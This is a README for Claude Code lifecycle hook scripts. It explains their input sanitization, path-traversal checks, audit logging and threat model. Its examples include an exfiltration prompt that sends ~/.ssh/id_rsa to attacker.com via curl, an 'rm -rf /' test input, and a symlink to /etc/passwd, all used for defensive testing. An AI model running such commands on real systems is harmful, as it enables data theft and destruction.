# Claude Code Lifecycle Hooks

**Version:** 2.0 (Pragmatic)
**Security:** Hardened against CVE-2025-53773 class vulnerabilities

---

## What These Hooks Do

### session-start.sh

**Runs:** When Claude Code session starts
**Purpose:** Announce startup, initialize metrics
**Security:** Read-only operations, no user input

### user-prompt-submit.sh

**Runs:** Before Claude processes each user prompt
**Purpose:** Auto-load tier1 files based on keywords
**Security:** Input sanitization, path validation, user visibility

### post-tool-use.sh

**Runs:** After each tool use
**Purpose:** Track metrics automatically
**Security:** Writes to safe location only (.claude-state/)

---

## Security Features (CVE-2025-53773 Lessons Applied)

### Input Sanitization

```bash
# ❌ VULNERABLE (original pattern)
if echo "$PROMPT" | grep -iE "test"; then

# ✅ SECURE (current implementation)
if printf '%s' "$PROMPT" | grep -qiF "test"; then
```

**Why secure:**

- `printf '%s'` prevents variable expansion (unlike `echo`)
- `grep -F` literal matching (no regex injection)
- `grep -q` quiet mode (performance)
- `grep -i` case-insensitive (usability)

### Path Validation

```bash
# Resolve symlinks
realpath_result=$(realpath "$filepath" 2>/dev/null)

# Verify within expected directory
if [[ "$realpath_result" != "$tier1_realpath"/* ]]; then
  echo "🚨 Security: Blocked path traversal attempt" >&2
  exit 1
fi
```

**Why secure:**

- `realpath` resolves symlinks (prevents traversal)
- Path prefix check ensures file is in tier1/
- Blocks attempts to read /etc/passwd, ~/.ssh/id_rsa, etc.

### User Visibility

```bash
# Announce what's loaded
echo "📖 Auto-loaded security.md (trigger: security keywords)"

# Log to audit trail
echo "[$TIMESTAMP] Auto-loaded: security.md" >> .claude-state/auto-load.log
```

**Why important:**

- CVE-2025-53773 lesson: AI can't bypass user authority
- User sees what files are loaded
- Audit trail provides accountability

### Opt-Out Mechanism

```bash
# User can disable auto-loading
touch .claude/no-auto-load

# Hook checks opt-out
if [[ -f .claude/no-auto-load ]]; then
  exit 0
fi
```

**Why important:**

- User control > AI automation
- Respects user preference
- AI governance principle

---

## Threat Model

### Trusted Context (This Repository)

- ✅ Hooks reviewed: 2025-10-25
- ✅ Security hardened: Input sanitization, path validation
- ✅ Source: https://github.com/[your-repo]

### Untrusted Context (Cloned Repos)

- ⚠️ **NEVER** clone untrusted repos with .claude/hooks/ enabled
- ⚠️ **ALWAYS** review .claude/hooks/\*.sh before first use
- ⚠️ **CHECK** git history for suspicious changes

### Attack Vectors Mitigated

**1. Prompt Injection → RCE**

```bash
# Attack attempt:
User types: "; curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa) #test"

# Our hook:
if printf '%s' "$PROMPT" | grep -qiF "test"; then
  # printf prevents expansion, no RCE possible
fi
```

**2. Path Traversal → Information Disclosure**

```bash
# Attack attempt:
Symlink: tier1/testing.md -> /etc/passwd

# Our hook:
realpath_result=$(realpath "$filepath")
if [[ "$realpath_result" != "$tier1_realpath"/* ]]; then
  # Blocked! File is outside tier1/
  exit 1
fi
```

**3. Supply Chain → Compromised Hooks**

- Mitigation: Manual review before use
- Mitigation: Git history check
- Mitigation: Trust verification

---

## Testing Security

### Test 1: Prompt Injection

```bash
# Test malicious input
.claude/hooks/user-prompt-submit.sh "; rm -rf / #test"

# Expected: No command execution, only literal grep match
```

### Test 2: Path Traversal

```bash
# Create symlink attack
ln -s /etc/passwd base-rules/tier1/evil.md

# Attempt to load
# Expected: Security block, file not loaded
```

### Test 3: User Visibility

```bash
# Normal use
.claude/hooks/user-prompt-submit.sh "write tests for auth"

# Expected: Announces "📖 Auto-loaded testing.md"
# Expected: Announces "📖 Auto-loaded security.md"
# Expected: Logs to .claude-state/auto-load.log
```

---

## Maintenance

### Adding New Keywords

Edit `user-prompt-submit.sh`:

```bash
# Add your keywords here
if printf '%s' "$PROMPT" | grep -qiF -e "new" -e "keywords"; then
  load_tier1_file "your-file.md" "your keywords"
fi
```

### Disabling Auto-Loading Temporarily

```bash
touch .claude/no-auto-load
```

### Re-Enabling Auto-Loading

```bash
rm .claude/no-auto-load
```

### Viewing Auto-Load Log

```bash
cat .claude-state/auto-load.log
```

### Viewing Metrics

```bash
cat .claude-state/metrics.json | jq .
```

---

## References

- **CVE-2025-53773:** GitHub Copilot RCE via prompt injection
- **Security research:** `../../../RESEARCH_SUMMARY_HOOKS_SECURITY.md`
- **Comparison:** `../../../FINAL_COMPARISON_ORIGINAL_VS_PRAGMATIC.md`
- **Shell security:** Stack Overflow consensus on input sanitization

---

## Last Security Review

**Date:** 2025-10-25
**Reviewer:** Claude (Sonnet 4.5) + User
**Status:** ✅ Approved for production use
**Next Review:** 2026-01-25 (quarterly)

---

**⚠️ Security Reminder:** These hooks run with YOUR user privileges. Review before using in untrusted repos.
